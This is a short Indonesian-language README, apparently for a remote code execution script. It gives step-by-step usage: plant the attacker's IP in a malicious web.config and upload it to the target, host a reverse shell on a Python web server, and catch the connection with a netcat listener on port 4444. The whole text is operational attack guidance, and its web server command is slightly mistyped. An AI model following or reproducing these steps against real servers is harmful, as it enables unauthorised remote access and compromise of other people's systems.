# Cara pakai script RCE

1. Ganti IP Address di web.config dengan IP kita
2. Upload web config
3. Ganti IP Address di Reverse shell dengan IP kita
4. Jalankan Web Server di tempat simpan reverse shell nya

```bash
python3 -m http-server 80
```

5. Jalankn Listener

```bash
nc -nvlp 4444
```